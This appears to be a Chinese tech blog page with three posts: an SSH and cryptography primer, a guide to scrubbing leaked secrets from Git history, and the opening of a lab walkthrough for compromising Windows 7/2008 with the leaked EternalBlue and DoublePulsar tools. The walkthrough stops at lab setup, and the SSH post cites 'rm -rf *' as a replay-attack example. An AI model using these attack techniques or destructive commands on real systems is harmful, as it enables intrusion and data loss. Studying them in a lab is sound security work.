<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>土豆不好吃</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="土豆不好吃">
<meta property="og:url" content="http://example.com/page/14/index.html">
<meta property="og:site_name" content="土豆不好吃">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Benny小土豆">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="土豆不好吃" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">土豆不好吃</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-ssh-1/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/05/08/ssh-1/index/" class="article-date">
  <time class="dt-published" datetime="2017-05-08T00:00:00.000Z" itemprop="datePublished">2017-05-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/linux/">linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/05/08/ssh-1/index/">[SSH系列1]：什么是SSH、背景知识，SSH协议需求与设计难点</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p> </p>
<h2 id="前言：为啥要写这一系列"><a href="#前言：为啥要写这一系列" class="headerlink" title="前言：为啥要写这一系列"></a>前言：为啥要写这一系列</h2><p>几个星期之前小蜗牛童鞋写了一篇文章提到了SSH，但是其中引用的<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html">阮一峰的博文</a>却有几处很明显的错误。<strong>无奈和感慨甚至是……愤恨之余</strong>，我顺便搜了下，好像大家都不是那么关注SSH，对SSH的原理更是知之甚少（貌似关注SSL&#x2F;TLS更多一些）。本着精益求精、顺便谈谈读书的问题，俺就只好亲自操刀写一系列文章，当然了我就是传说中的<strong>挖坑不填的超级不靠谱的人</strong>，我超级不负责说不定啥时候就给缩水了。</p>
<p>上一篇<a target="_blank" rel="noopener" href="https://dmesg.app/school-0.html">学校上网系列</a>还差个如何下载软件没有填（那个……某童鞋麻烦你从垃圾站下载个全家桶回来？），这一系列指不定会几个月填完。</p>
<p>所以嘛总结下来，别期待太多。</p>
<p>但咱今天就开始直接说正题吧，毕竟，给个甜头瞧瞧是不？</p>
<h2 id="本系列的目录"><a href="#本系列的目录" class="headerlink" title="本系列的目录"></a>本系列的目录</h2><p>1. 什么是SSH、背景知识，SSH协议需求与设计难点</p>
<p>2. SSH协议层次、架构的实现：连接，认证，传输</p>
<p>3. 来谈谈“学而不思则罔”</p>
<p>本篇我们主要谈论的问题有：什么是SSH、密码学背景知识，SSH协议需求与设计难点</p>
<h2 id="什么是SSH以及SSH的优点"><a href="#什么是SSH以及SSH的优点" class="headerlink" title="什么是SSH以及SSH的优点"></a>什么是SSH以及SSH的优点</h2><p>考虑到阅读本文的人应该知道什么是SSH，这里我也不费口水解释了，直接<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Secure_Shell">从维基百科上抄录如下</a>：</p>
<blockquote>
<p>Secure Shell（缩写为SSH），由IETF的网络工作小组（Network Working Group）所制定；SSH为一项创建在应用层和传输层基础上的安全协议，为计算机上的Shell（壳层）提供安全的传输和使用环境。</p>
<p>传统的网络服务程序，如rsh、FTP、POP和Telnet其本质上都是不安全的；因为它们在网络上用明文传送数据、用户帐号和用户口令，很容易受到中间人（man-in-the-middle）攻击方式的攻击。就是存在另一个人或者一台机器冒充真正的服务器接收用户传给服务器的数据，然后再冒充用户把数据传给真正的服务器。</p>
<p>而SSH是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用SSH协议可以有效防止远程管理过程中的信息泄露问题。通过SSH可以对所有传输的数据进行加密，也能够防止DNS欺骗和IP欺骗。</p>
<p>SSH之另一项优点为其传输的数据可以是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、POP、甚至为PPP提供一个安全的”通道”。</p>
</blockquote>
<p>从中我们可以看到，SSH的优点是安全、加密，可以作为隧道协议来”包裹”其他不安全的协议。</p>
<p>不知道大家有没有了解过SSL&#x2F;TLS的基本原理，SSH给人的感觉很像 SSL&#x2F;TLS，然而这两者还是有些差别的。下面咱就直接开始吧，不废话了。</p>
<p>[v_blue]注：本系列内容如无特殊说明，SSH均为SSH2，实现为OpenBSD的子项目OpenSSH[&#x2F;v_blue]</p>
<h1 id="背景知识，SSH协议需求，设计难点"><a href="#背景知识，SSH协议需求，设计难点" class="headerlink" title="背景知识，SSH协议需求，设计难点"></a>背景知识，SSH协议需求，设计难点</h1><h2 id="计算机网络背景知识"><a href="#计算机网络背景知识" class="headerlink" title="计算机网络背景知识"></a>计算机网络背景知识</h2><p>SSH不像https是在http基础上衍生出来的，所以这里我们无需像https一样再次介绍http，我们只需要知道，SSH是一个TCP之下的协议。</p>
<h3 id="SSH的版本"><a href="#SSH的版本" class="headerlink" title="SSH的版本"></a>SSH的版本</h3><p>SSH主要有SSH1和SSH2两个版本，二者互不兼容。此两者的设计思想是基本相同的， SSH2修复了在SSH1中的一些不安全的设计、新增加了一些算法的支持等等。</p>
<h3 id="SSH与TCP的关系"><a href="#SSH与TCP的关系" class="headerlink" title="SSH与TCP的关系"></a>SSH与TCP的关系</h3><p>我们先看这个图吧：</p>
<p><img src="/images/050717_1305_SSH1SSH1.jpg"></p>
<p>在计算机网络中，我们实际使用的是TCP&#x2F;IP的四层协议而不是OSI的七层（在一些情况下为了方便讲解我们会把这二者综合成五层协议）</p>
<p>简单地说，TCP 协议是传输层的两大协议之一，在网络分层模型中，TCP 被称为”传输层协议”，而 SSH被称为”应用层协议”。有很多常见的应用层协议是以 TCP 为基础的，比如”FTP、SMTP、POP、IMAP”等。</p>
<p>TCP 被称为”面向连接”的传输层协议。关于它的具体细节，<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">咱就去看维基百科吧</a>，这玩意能写出来一本一千页的书。你只需知道：传输层主要有两个协议，分别是 TCP 和 UDP。TCP 是可靠的传输协议， TCP 协议能够确保报文的顺序。</p>
<p>[v_error]注意：更可靠是否就意味着UDP是不能用的？谁不喜欢可靠的东西嘛？其实不是这样的，TCP和UDP都有着不同的适用条件。大家可以自己思考下为什么这俩协议都是非常有用滴。[&#x2F;v_error]</p>
<h2 id="密码学背景知识"><a href="#密码学背景知识" class="headerlink" title="密码学背景知识"></a>密码学背景知识</h2><p>说道密码学，大家可能以为这玩意真的很高深，其实也确实是这样的；但是如果想要对密码学的一些技术有一些入门的了解，还是很简单的。这里我们就简单的介绍下密码学的一些”工具箱”，要不，下一篇都会看不懂的。</p>
<p>[v_blue]注意：为了防止概念混淆，我们统一把密码（也就是你登录某个账号时输入的那个东西）说成”口令”。[&#x2F;v_blue]</p>
<h3 id="加密、解密与密钥是什么？"><a href="#加密、解密与密钥是什么？" class="headerlink" title="加密、解密与密钥是什么？"></a>加密、解密与密钥是什么？</h3><p>加密就是<strong>把明文变成密文</strong>的过程，解密就是<strong>把密文变成明文</strong>的过程。此二者是互逆的，就好似减法是加法的逆运算一样。在加密和解密的过程中，需要一个”密钥”来参与数学运算，这个密钥就好像是你的钥匙一样。</p>
<h3 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h3><p>所谓对称密码（对称加密），就是<strong>加密和解密的时候使用同一个密钥</strong>。这个很好理解，就像你用WinRAR啥玩意压缩一个文件的时候设置了一个口令，解压缩的时候也要用这个密码才能成功提取文件一样，这个”口令”就相当于我们上面说的密钥。对称密码有两种不同的色剂，可以分为流密码、分组密码。</p>
<p>分组密码共有五种<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F">分组模式</a>，在这里就不提了否则又要严重跑题并且增加文章长度，感兴趣的可以去围观维基百科。</p>
<p>我们常用的对称密码有DES、3DES、AES、Blowfish、IDEA、RC5、RC6等。其中AES竞标时最后入围共有五种算法：Rijndael、Serpent、 Twofish、MARS 和RC6，最后Rijndael被选作AES。</p>
<h3 id="非对称密码"><a href="#非对称密码" class="headerlink" title="非对称密码"></a>非对称密码</h3><p>非对称密码（非对称加密）也被称作公钥密码，所谓”非对称”，意思就是<strong>加密和解密的时候使用不同的密钥</strong>，挺难理解的是吧，但是咱得说，这种非对称的想法可是密码学上最大的突破之一。</p>
<p>咱在这里只要知道，非对称密码有一组密钥，这组密钥中，<strong>公开的被称为公钥，私有的被称作私钥</strong>；使用公钥加密的文件只有使用对应的私钥才能解开；使用私钥加密（签名）的文件只有使用对应的公钥才能解开。理论上来说，每一对公钥和私钥之间有着严谨的数学关系，很难互相推导。但是吧，在目前的大部分实现中(RSA)，通过公钥推导出对应的私钥很难，但是通过私钥推公钥是很可能的。，感谢<a target="_blank" rel="noopener" href="https://twitter.com/GFW">jaehee~임재희</a>的指正，<code>openssl rsa -in privkey.pem -pubout</code></p>
<p>非对称密码中比较出名的有RSA和椭圆曲线（ECC）。</p>
<p>总结：对称密码和非对称密码的优缺点咱能看出来，对称密码的实现比较简单，但是能干的事情却没有公钥密码那么多；但是公钥密码的设计通常要涉及到一些比较复杂的数学问题，所以公钥密码的速度通常要比对称密码差几个数量级；并且，公钥密码需要比较长的密钥长度才能够保证类似等同于对称密码的加密强度，NIST的建议是，RSA和DSA是1024位，ECC是160位，相应的对称分组密码（比如说AES-CBC）的密钥长度是80位；或者说AES为128位、RSA 2048和ECC 256位。</p>
<h3 id="单向散列函数"><a href="#单向散列函数" class="headerlink" title="单向散列函数"></a>单向散列函数</h3><p>大家熟悉这个吗？</p>
<p><img src="/images/050717_1305_SSH1SSH2.png"></p>
<p>单向散列函数就相当于消息的指纹，指纹这东西嘛，就是接近独一无二的咯。咱把一个消息（文件）使用单向散列函数处理一下，就会有一个定长的”指纹”（也被称作散列值、摘要），我们就可以用这段摘要来唯一的代表这个消息；假如某天这个消息变化了哪怕是1比特，那么这个摘要也会变得面目全非，这样咱就能知道原来的消息被篡改了。</p>
<p>换句话说，单向散列函数可以用来验证消息的完整性。</p>
<p>咱常用的单向散列函数有MD5、SHA1等等。</p>
<h3 id="消息认证码"><a href="#消息认证码" class="headerlink" title="消息认证码"></a>消息认证码</h3><p>消息认证码就是一种能够<strong>确定消息的完整性并且能够进行认证</strong>的技术。所谓”完整性”、”一致性”，就是消息没有被篡改；所谓”认证”，就是消息来自正确的发送者。消息认证码是一种结合了<strong>单向散列函数和对称密码</strong>的密码学技术。我们常用的HMAC就是其中之一。</p>
<h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>前面我们提到了公钥和私钥。我们知道公钥是公开的、私钥是私有的，如果我们使用私钥对某个文件进行加密（实际上应该被称作签名），那么任何人都可以对此进行解密，看似这里似乎失去了加密的意义，但这实际上可以证明一点：只有持有私钥的人才能够进行加密，这也意味着我们可以<strong>认证、防止否认、完整性</strong>。</p>
<p>咱一般都是对消息的散列进行”签名”，因为公钥密码比较慢嘛。</p>
<h3 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h3><p>如果读者学习过某些程序设计语言，可能记得他们的标准库中都有个类似random的东西可以生成某个范围内的随机数。我们看那个随机数似乎是统计学上随机的，但实际上咱要认识到一件非常残酷的事实：计算机是无法生成真正的随机数的，所以我们称随机数算法为”伪随机数算法”。</p>
<p>这好像挺难理解的，咱只要知道吧，只要随机数算法是固定的，在给一个固定的”种子”，那么每次生成的随机数也就是固定的、有规律可循的。</p>
<p>那这随机数有啥用啊？还记得上面提到的密钥吗，在密码学中，随机数可是无处不在的。</p>
<p>随机数有一些比较重要的性质：<strong>随机性</strong>（不存在统计学偏差）、<strong>不可预测性</strong>（不能根据过去的随机数序列预测未来的随机数序列）、<strong>不可重现性</strong>（不能重现该序列），密码学上使用的伪随机数算法至少也要做到前两点。</p>
<p>咱要记得，凡是线性随余算法的随机数都不能作为密码学应用；请使用语言的标准库中提供的密码学算法，或者是使用OpenSSL、<code>/dev/random</code>这类安全的实现。</p>
<p>说了这么多密码学的工具，估计可能已经蒙圈了吧？别急，咱继续，接下来咱来分析下SSH设计的需求，这才是重头戏。</p>
<h2 id="SSH协议需求"><a href="#SSH协议需求" class="headerlink" title="SSH协议需求"></a>SSH协议需求</h2><h3 id="保密性（防止泄密）"><a href="#保密性（防止泄密）" class="headerlink" title="保密性（防止泄密）"></a>保密性（防止泄密）</h3><p>SSH 需要做到足够好的保密性。</p>
<p>SSH首先要能够对抗嗅探。所谓的”嗅探”，通俗而言就是监视你的网络传输流量。比如说某些网关设备啊，甚至是某些情况下开了混杂模式的网卡都可以轻而易举的嗅探到你的网络流量。如果你使用明文的协议，那么监视者通过嗅探，就知道你传输的内容，自然而然也就包括密码啦什么的。。</p>
<p>嗅探是比较低级的攻击手段了，下面咱会谈一种很变态的攻击手段：重放攻击。</p>
<h3 id="完整性（防止篡改）"><a href="#完整性（防止篡改）" class="headerlink" title="完整性（防止篡改）"></a>完整性（防止篡改）</h3><p>除了”保密性”，还有一个同样重要的目标是”确保完整性”。完整性就是协议会保证传输的内容是不能被篡改的。</p>
<p>如果换到HTTPS上的完整性，咱就想想那些http的页面被ISP插入的广告，而HTTPS却不会有ISP的广告，这样就好理解了。</p>
<p>在完整性中，有一种比较变态的手段叫做”<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Replay_attack">重放攻击</a>“。举个栗子，假如某个攻击者监听了你的SSH会话，他将你执行某个命令（比如说rm –rf *）的报文记录下来，然后在你切换到~的时候插入这个报文，那么你就会错误的删除自己家目录下的所有文件。攻击者并没有解密你的通信，他的攻击之所以能够成功是因为发送的报文是真实有效的，而TCP的完整性校验是基于报文的，所以SSH必须要有一种有效的校验方式来抵抗这种攻击手法。</p>
<h3 id="真实性"><a href="#真实性" class="headerlink" title="真实性"></a>真实性</h3><p>我猜很多人都不会考虑到”真实性”，那么让我来问你一个问题，你怎么知道你访问的网站真的是目标网站而不是其他人仿冒的？看域名？别扯了域名系统本身就是不可靠的。</p>
<p>在SSH的设计中，也必须要通过某种手段来保证真实性的需求，当然了这里SSH的设计要比HTTPS的简单的多。</p>
<h3 id="转发（隧道）、可扩展性"><a href="#转发（隧道）、可扩展性" class="headerlink" title="转发（隧道）、可扩展性"></a>转发（隧道）、可扩展性</h3><p>咱把SSH设计出来，还有一个作用是可以像SSL&#x2F;TLS一样来作为”隧道”来保护、强化其他协议的安全性。所谓转发，就是在SSH会话中封装了其他的基于TCP的应用层协议，借此可以把SSH的安全特性应用到这个应用层协议上。</p>
<h3 id="高性能"><a href="#高性能" class="headerlink" title="高性能"></a>高性能</h3><p>咱谁都不喜欢性能低下的协议吧，毕竟加密、解密等过程中是存在性能开销的，如何设计SSH使得性能不至于太差也是至关重要的。所以SSH得关注于如何使用加密算法（对称or非对称）。</p>
<h2 id="SSH协议的设计难点"><a href="#SSH协议的设计难点" class="headerlink" title="SSH协议的设计难点"></a>SSH协议的设计难点</h2><p>类似SSL&#x2F;TLS，SSH的设计同样需要解决一些很蛋疼的问题，类比于SSL&#x2F;TLS, SSH中设计难点主要有：</p>
<h3 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h3><p>如果张三要和李四建立一个加密通信的信道，那么他们就要先约定好一个加密算法，然后交换一个密钥。在这种情况下，约定的算法被其他人知道是没关系的，但是密钥却不能被其他人得知，得到密钥等同于得到明文。</p>
<p>回到开头，加密通信建立起来之前，咱必须协商算法、交换密钥（这个过程一般被称作握手），可是加密通信还没建立了，握手过程中必然是明文的，咋安全的交换密钥啊？所以啊，<strong>如何在不安全的网络中安全的进行密钥交换</strong>，这大概是非常蛋疼的一个问题，也是设计中的一个难点。俺剧透一下，DH交换就挺不错的其实。</p>
<h3 id="服务器认证以及客户端认证"><a href="#服务器认证以及客户端认证" class="headerlink" title="服务器认证以及客户端认证"></a>服务器认证以及客户端认证</h3><p>不同于SSL&#x2F;TLS，SSH协议需要客户端认证服务器、服务器也需要认证客户端，换句话说，SSH的过程是双向认证。对服务器进行认证可以确保你连接到了正确的服务器而不是冒牌货、也就是防止中间人攻击；对客户进行认证，则被称作为“授权”更恰当，最简单单也最脆弱的则是通过密码实现的，还有一些比如使用公钥、kerberos等。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>说了这么多废话，来介绍密码学基础知识、SSH设计的需求和难点，是为了啥呢？因为只有当你了解这些，在后面介绍 SSH 的实现原理时，你才能更容易理解当初为啥要这么设计协议，这也就更方便理解why啦。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/05/08/ssh-1/index/" data-id="clhp7rtk80090s2qrdwnp07h7" data-title="[SSH系列1]：什么是SSH、背景知识，SSH协议需求与设计难点" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-git-password/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/04/28/git-password/index/" class="article-date">
  <time class="dt-published" datetime="2017-04-28T00:00:00.000Z" itemprop="datePublished">2017-04-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/security/">security</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/04/28/git-password/index/">不小心把密码上传到GitHub了，怎么办</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <blockquote>
<p>辛辛苦苦写了个脚本，一个兴奋就给推送到GitHub了，然后才反应过来脚本里好像硬编码了帐号密码；根据某某SDK写了个客户端，一下子推送上去发现API Key忘了抹；更有甚者直接把SSHKey推送上去了……</p>
</blockquote>
<p>总之就是一不小心把敏感信息推到了版本控制的Git上，可能会马上反应过来，可能过了好几个月才反应过来，那该怎么办呢？本文就将讨论一下已经推送到GitHub之后几种比较可行的方式，希望大家伙都不会有必要读到此文，唉！（如果没推的话，amend啥的就好了）</p>
<p>天啊我真是太喜欢这首歌了，快来听听吧<del>irony, ironical, ironic，为了防止正在上课的小伙伴被抓到，我把主题的自动播放干掉了哈哈哈</del> :mrgreen: [netmusic id&#x3D;”31421442”]</p>
<h2 id="必须要做的后备措施"><a href="#必须要做的后备措施" class="headerlink" title="必须要做的后备措施"></a>必须要做的后备措施</h2><p>如果反应过来自己把敏感信息（尤其是帐号密码）推送到了GitHub上，尤其是很长时间之后才发现的，第一件要做的事情是更改掉对应的密码、尽可能的开启两步验证、作废API Key等必要的预备措施。因为我们无法得知究竟有多少人看过、克隆、复刻过仓库，也就无法评估危险等级，只能亡羊补牢了。</p>
<p>在说正确的方法之前，咱先说一说一个大错特错的方法</p>
<h2 id="错误方法一：修改代码中的敏感信息"><a href="#错误方法一：修改代码中的敏感信息" class="headerlink" title="错误方法一：修改代码中的敏感信息"></a>错误方法一：修改代码中的敏感信息</h2><p>很多人第一想法可能会是修改代码中的敏感信息，然后commit &amp; push。看似这样是解决了问题，但实际上问题依旧存在，这样做是大错特错的！为何？Git作为一个优秀的版本控制系统，其核心能力就是能够穿梭于每次历史记录（也就是commit），这样做实际上只是在最新的版本库中不存在敏感信息，只要咱checkout下自然就能看到有着敏感信息的那次commit，还有毛用嘛！ 类似的办法还有revert啥的，没用的！ <a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/04/201704281441265.png"><img src="/images/201704281441265.png"></a></p>
<h2 id="错误的方法二：置之不理"><a href="#错误的方法二：置之不理" class="headerlink" title="错误的方法二：置之不理"></a>错误的方法二：置之不理</h2><p>实际上这不算是一种方法，而是一种态度吧。如果你想成为一名优秀的程序员，那么注重细节、注重安全自然是比较珍贵的素质；同时我敢说大部分人都是一两个密码走天下、没有开启两步验证的，这样暴露密码极大地提高了撞库的机率，渗透的第一步搜集信息就得到了密码。 也许有人会反驳，谁没事干看我仓库读代码？或许真的没有人会无聊到这样，或许有了你也很难发现，但是请允许我介绍一种名为Gitrob的工具。人可能没那么无聊，但是机器可不怕无聊的工作，是吧。</p>
<p>下面咱来说说几个比较可行的方式吧！</p>
<h2 id="方法一：删库"><a href="#方法一：删库" class="headerlink" title="方法一：删库"></a>方法一：删库</h2><p>最简单的办法就是删库。确实简单粗暴，对于一些可有可无的仓库来说这应该是最好的处理方法了。对于那些比较珍贵的仓库，这个办法很显然是行不通的。</p>
<h2 id="方法二：通过临时仓库覆盖敏感信息"><a href="#方法二：通过临时仓库覆盖敏感信息" class="headerlink" title="方法二：通过临时仓库覆盖敏感信息"></a>方法二：通过临时仓库覆盖敏感信息</h2><p>思路很简单，备份仓库，在敏感信息之前的一次提交创建临时分支，删除有着敏感信息的分支，从临时分支创建新的默认分支，然后再push修改过的代码。如果使用GitHub，可能还需要把默认分支设置成临时分支。如果你使用的是比较方便的图形化Git客户端如Source Tree、GitKraken，那么这一步应该很容易，就不放图了…… 这个方法只适用于发现的比较快的、敏感信息之后commit不太多的仓库。如果敏感信息之后commit &amp; push了很多，这就不太方便了。</p>
<h2 id="方法三：使用git-filter-branch"><a href="#方法三：使用git-filter-branch" class="headerlink" title="方法三：使用git filter-branch"></a>方法三：使用<code>git filter-branch</code></h2><p><code>git filter-branch</code>的方法其实挺复杂的，而且不是那么方便，推荐大家还是用方法4吧，这个看看就够了。假如咱要从所有的历史记录中删除某个文件，其实就大概这么一句就差不多了</p>
<p>git filter-branch –force –index-filter ‘git rm –cached –ignore-unmatch sensitive-data.py’ –prune-empty –tag-name-filter cat – –all</p>
<p>这样那个文件的记录就没啦。咱再force push下，远程仓库的就和本地的一样啦。</p>
<p>git push origin –force –all</p>
<p>当然了，如果有必要的话，记得不带敏感信息的代码再推上去。</p>
<h2 id="方法四：使用专用工具BFG-Repo-Cleaner"><a href="#方法四：使用专用工具BFG-Repo-Cleaner" class="headerlink" title="方法四：使用专用工具BFG Repo-Cleaner"></a>方法四：使用专用工具BFG Repo-Cleaner</h2><p>咱能看出来上面的命令听复杂，参数很多，于是就有个兄弟写了个工具来一键解决咱们的问题。主页<a target="_blank" rel="noopener" href="https://rtyley.github.io/bfg-repo-cleaner/">在这</a>，估计大家都能看懂吧？我再简述一下，假如我的仓库名字为<code>python_test_code</code>，敏感文件的名字为<code>ygmail_test.py</code>的话，</p>
<p>java -jar bfg.jar  –delete-files ygmail_test.py python_test_code</p>
<p>大然后再看下，那么敏感文件就没了，然后再force push就行了~基本上不会有其他问题。</p>
<p>可是这样删除文件好像不太友好呢，有没有办法直接把敏感信息替换成其他内容啊？有啊！</p>
<p>先创建一个名为<code>password.txt</code>的文件，在其中一行一个输入你的敏感信息，比如说密码啦，邮箱啦，等等啦，然后运行这么一句(（如果要清除的内容带中文，记得编码为UTF-8哟）：</p>
<p>java -jar bfg.jar –replace-text password.txt python_test_code</p>
<p>话说这作者，嗯……我很喜欢，我运行完竟然给我来了一句：</p>
<blockquote>
<p>You can rewrite history in Git - don’t let Trump do it for real! Trump’s administration has lied consistently, to make people give up on ever being told the truth. Don’t give up: <a target="_blank" rel="noopener" href="https://www.aclu.org/">https://www.aclu.org/</a></p>
</blockquote>
<p>当然了，bfg的还可以删除那些仓库历史里的大文件。比如说咱以前上传了几个二进制大文件，然后又删掉再也不需要了，如果clone的话，那么这几个大文件也会跟着一起clone下来的其实。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>俺才疏学浅，只能想到这么几种办法了，唉~！不要说我为啥要写这么一篇博文，泪啊！这事我都干了三次了，真是受不了自己的愚蠢了，也亲眼看着其他人干过……<strong>某个可爱的小童鞋，抽时间解决了这个安全问题吧。</strong></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/04/28/git-password/index/" data-id="clhp7rtgd0031s2qr5ssr3d6f" data-title="不小心把密码上传到GitHub了，怎么办" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-shadowbroker/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/04/22/shadowbroker/index/" class="article-date">
  <time class="dt-published" datetime="2017-04-22T00:00:00.000Z" itemprop="datePublished">2017-04-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/04/22/shadowbroker/index/">[ShadowBroker]1：NSA工具集EternalBlue + Doublepulsar + meterpreter渗透Windows 7/2008，兼谈Windows Server 2003中文版渗透</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[v_error]警告： 本文仅供实验性研究，请勿用于非法用途，出啥事我不负责。真的！别算我头上，我胆小害怕。 好吧，如果这免责声明能管用的话……[&#x2F;v_error]</p>
<p>有个歪果仁写了一系列文章，蛮详细的，如果有兴趣的话可以戳去读一读吧：_<a target="_blank" rel="noopener" href="http://www.pwn3d.org/posts/1721872-from-git-clone-to-pwned-owning-windows-with-doublepulsar-and-eternalblue-part-1">From git clone to Pwned - Owning Windows with DoublePulsar and EternalBlue</a>_ </p>
<p>目前，某些特定版本的Windows 10也可以了，可以参见这个PR <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/pull/9473">https://github.com/rapid7/metasploit-framework/pull/9473</a></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>几个星期之前Shadow Broker把NSA的黑客工具偷出来并公布了，据说这些工具非常强大，一个小毛孩都能拿着这些黑掉大半个瘟斗士……嗯，今天我这小毛孩跟你们说下，确实如此好吧。</p>
<p>本文我们将会集中讨论在Windows上使用EternalBlue来渗透Windows 7&#x2F;2008，然后使用插件Doublepulsar来注入dll。咱使用的工具是NSA的”metasploit”，名为”FuzzBunch”</p>
<h3 id="为啥选择EternalBlue"><a href="#为啥选择EternalBlue" class="headerlink" title="为啥选择EternalBlue"></a>为啥选择EternalBlue</h3><p>在NSA泄露的那对工具之中，EternalBlue是唯一一个能够攻击Windows 7和Windows Server 2008、并且不需要任何认证信息的工具；在expliot成功之后，我们使用Doublepulsar将我们制作的恶意dll注入系统进程中，从而拿到shell</p>
<h3 id="概念解释"><a href="#概念解释" class="headerlink" title="概念解释"></a>概念解释</h3><p><strong>exploit</strong>：就是用来触发漏洞的程序</p>
<p><strong>payload</strong>：就是触发漏洞之后执行的代码。如果exploit是火药的话，payload就是（具有杀伤力的）弹头</p>
<p><strong>framework</strong>：为了方便使用、测试、研究，人们把这么一大堆东西放到一起做成一个”框架”，咱可以在这一个框架里完成exploit、payload等操作，不用来回切换，嗯粗略理解就是个这么玩意。</p>
<h2 id="准备实验环境"><a href="#准备实验环境" class="headerlink" title="准备实验环境"></a>准备实验环境</h2><p>我们需要准备三台电脑，好吧，其实虚拟机就够了（记得设置成桥接）。并且这三台电脑要在同一局域网下，也就意味着能够互相ping通</p>
<h3 id="目标机、靶机：-Windows-7-x64-SP1：172-26-99-211"><a href="#目标机、靶机：-Windows-7-x64-SP1：172-26-99-211" class="headerlink" title="目标机、靶机： Windows 7 x64 SP1：172.26.99.211"></a>目标机、靶机： Windows 7 x64 SP1：172.26.99.211</h3><p>Windows 7、Windows server 2008在此作为我们的靶机，也就是受害者。我们啥也不需要知道，只要有个IP、能够ping通就好了。</p>
<p>感谢我室友那英勇就义的电脑啊！</p>
<h3 id="攻击机1-FuzzBunch（主要）：Windows-XP-SP3-172-26-97-206"><a href="#攻击机1-FuzzBunch（主要）：Windows-XP-SP3-172-26-97-206" class="headerlink" title="攻击机1 FuzzBunch（主要）：Windows XP SP3:172.26.97.206"></a>攻击机1 FuzzBunch（主要）：Windows XP SP3:172.26.97.206</h3><p>我们用XP来运行FuzzBunch。我猜没人想用wine吧？为啥用xp呢？xp比较小，在虚拟机中安装速度比较快，省时间，省硬盘，嗯……</p>
